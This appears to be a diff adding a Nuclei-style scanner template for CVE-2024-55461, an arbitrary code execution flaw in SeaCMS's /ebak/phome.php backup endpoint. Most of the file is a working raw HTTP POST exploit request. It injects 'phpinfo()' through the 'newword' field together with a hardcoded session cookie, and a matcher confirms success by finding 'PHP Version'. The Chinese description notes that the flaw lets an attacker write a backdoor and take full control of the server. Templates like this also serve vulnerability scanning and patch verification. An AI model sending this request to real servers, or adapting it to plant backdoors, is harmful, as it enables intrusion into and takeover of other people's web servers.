@@ -1,0 +1,31 @@
+id: seacms-phomephp-rce
+
+info:
+  name: SeaCMS海洋影视管理系统 phome.php 任意代码执行漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    SeaCMS海洋影视管理系统在/ebak/phome.php接口中存在任意代码执行漏洞。经过身份验证的攻击者可利用此漏洞在目标系统上执行任意代码，通过写入后门文件实现对Web服务器的完全控制。
+  reference:
+  - CVE-2024-55461
+  tags: SeaCMS海洋影视管理系统
+
+http:
+- raw:
+  - |
+    POST /z5fskt/ebak/phome.php?phome=RepPathFiletext HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Cookie: PHPSESSID=4qqjagpiagq24ekmdl76fljqac
+    Connection: close
+
+    mypath=test&oldword=sea_co_cls&newword=phpinfo()&dozz=1
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'PHP Version'
